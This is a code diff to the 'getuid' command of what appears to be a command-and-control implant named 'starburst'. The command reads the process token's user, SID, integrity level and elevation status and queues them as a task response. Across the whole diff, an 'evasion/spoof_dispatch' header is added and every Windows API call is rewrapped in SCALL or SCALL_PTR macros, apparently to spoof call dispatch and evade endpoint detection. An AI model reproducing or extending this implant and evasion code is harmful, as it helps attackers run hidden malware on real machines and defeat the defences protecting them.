@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_GETUID
 
@@ -27,7 +28,7 @@ auto declfn starburst::cmd_getuid(
     HANDLE h_token = nullptr;
     HANDLE h_proc = reinterpret_cast<HANDLE>( static_cast<intptr_t>( -1 ) );
 
-    if ( !inst.advapi32.OpenProcessToken( h_proc, TOKEN_QUERY, &h_token ) ) {
+    if ( !SCALL( inst, advapi32.OpenProcessToken, h_proc, TOKEN_QUERY, &h_token ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "OpenProcessToken failed" ) ) );
         return;
@@ -36,7 +37,7 @@ auto declfn starburst::cmd_getuid(
     uint32_t out_cap = 1024;
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
-        inst.kernel32.CloseHandle( h_token );
+        SCALL( inst, kernel32.CloseHandle, h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -45,22 +46,22 @@ auto declfn starburst::cmd_getuid(
 
     // --- Get username (DOMAIN\User) ---
     DWORD needed = 0;
-    inst.advapi32.GetTokenInformation( h_token, TokenUser, nullptr, 0, &needed );
+    SCALL( inst, advapi32.GetTokenInformation, h_token, TokenUser, nullptr, 0, &needed );
     if ( needed > 0 ) {
         auto tu = static_cast<TOKEN_USER*>( inst.heap_alloc( needed ) );
-        if ( tu && inst.advapi32.GetTokenInformation( h_token, TokenUser, tu, needed, &needed ) ) {
+        if ( tu && SCALL( inst, advapi32.GetTokenInformation, h_token, TokenUser, tu, needed, &needed ) ) {
             wchar_t name_w[128] = { 0 };
             DWORD name_len = 128;
             wchar_t domain_w[128] = { 0 };
             DWORD domain_len = 128;
             SID_NAME_USE snu = SidTypeUnknown;
 
-            if ( inst.advapi32.LookupAccountSidW( nullptr, tu->User.Sid,
+            if ( SCALL( inst, advapi32.LookupAccountSidW, nullptr, tu->User.Sid,
                     name_w, &name_len, domain_w, &domain_len, &snu ) ) {
                 char domain[128] = { 0 };
                 char name[128] = { 0 };
-                inst.kernel32.WideCharToMultiByte( CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
-                inst.kernel32.WideCharToMultiByte( CP_ACP, 0, name_w, -1, name, 128, nullptr, nullptr );
+                SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
+                SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, name_w, -1, name, 128, nullptr, nullptr );
 
                 str_copy( output + off, domain );
                 off += str_len( domain );
@@ -82,7 +83,7 @@ auto declfn starburst::cmd_getuid(
 
             if ( pConvertSidToStringSidA && pLocalFree ) {
                 LPSTR sid_str = nullptr;
-                if ( pConvertSidToStringSidA( tu->User.Sid, &sid_str ) && sid_str ) {
+                if ( SCALL_PTR( inst, pConvertSidToStringSidA, tu->User.Sid, &sid_str ) && sid_str ) {
                     str_copy( output + off, symbol<char*>( const_cast<char*>( " (SID: " ) ) );
                     off += 7;
                     uint32_t slen = str_len( sid_str );
@@ -90,7 +91,7 @@ auto declfn starburst::cmd_getuid(
                     memory::copy( output + off, sid_str, slen );
                     off += slen;
                     output[off++] = ')';
-                    pLocalFree( sid_str );
+                    SCALL_PTR( inst, pLocalFree, sid_str );
                 }
             }
 
@@ -108,14 +109,14 @@ auto declfn starburst::cmd_getuid(
             expr::hash_string( "GetSidSubAuthorityCount" ) ) );
 
     needed = 0;
-    inst.advapi32.GetTokenInformation( h_token, TokenIntegrityLevel, nullptr, 0, &needed );
+    SCALL( inst, advapi32.GetTokenInformation, h_token, TokenIntegrityLevel, nullptr, 0, &needed );
     if ( needed > 0 && pGetSidSubAuthority && pGetSidSubAuthorityCount ) {
         auto til = static_cast<TOKEN_MANDATORY_LABEL*>( inst.heap_alloc( needed ) );
-        if ( til && inst.advapi32.GetTokenInformation( h_token, TokenIntegrityLevel, til, needed, &needed ) ) {
-            PUCHAR p_count = pGetSidSubAuthorityCount( til->Label.Sid );
+        if ( til && SCALL( inst, advapi32.GetTokenInformation, h_token, TokenIntegrityLevel, til, needed, &needed ) ) {
+            PUCHAR p_count = (PUCHAR)SCALL_PTR( inst, pGetSidSubAuthorityCount, til->Label.Sid );
             DWORD* sub_auth = nullptr;
             if ( p_count && *p_count > 0 ) {
-                sub_auth = pGetSidSubAuthority( til->Label.Sid, (DWORD)( *p_count - 1 ) );
+                sub_auth = (DWORD*)SCALL_PTR( inst, pGetSidSubAuthority, til->Label.Sid, (DWORD)( *p_count - 1 ) );
             }
 
             str_copy( output + off, symbol<char*>( const_cast<char*>( " [Integrity: " ) ) );
@@ -153,7 +154,7 @@ auto declfn starburst::cmd_getuid(
     // --- Get elevation status ---
     TOKEN_ELEVATION te = {};
     needed = sizeof( TOKEN_ELEVATION );
-    if ( inst.advapi32.GetTokenInformation( h_token, TokenElevation, &te, sizeof( te ), &needed ) ) {
+    if ( SCALL( inst, advapi32.GetTokenInformation, h_token, TokenElevation, &te, sizeof( te ), &needed ) ) {
         str_copy( output + off, symbol<char*>( const_cast<char*>( " [Elevated: " ) ) );
         off += 12;
 
@@ -170,7 +171,7 @@ auto declfn starburst::cmd_getuid(
 
     output[off] = '\0';
 
-    inst.kernel32.CloseHandle( h_token );
+    SCALL( inst, kernel32.CloseHandle, h_token );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
